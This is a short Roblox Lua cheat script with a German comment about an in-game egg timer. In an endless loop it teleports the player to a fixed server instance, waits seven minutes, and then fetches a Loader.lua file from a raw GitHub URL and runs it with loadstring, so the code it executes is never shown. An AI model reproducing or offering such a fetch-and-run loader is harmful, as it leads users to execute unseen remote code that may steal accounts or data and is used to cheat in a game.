-- Zeit in Sekunden, wie lange das Egg verfügbar ist
local EggTimeLeft = 420
while true do
    game:GetService("TeleportService"):TeleportToPlaceInstance(85896571713843, "03d10852-24e5-44ea-9e2e-11dfd3bf7a83")
    wait(EggTimeLeft)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/PxnifyDev/roblox-job-ids/main/data/Loader.lua"))()
end
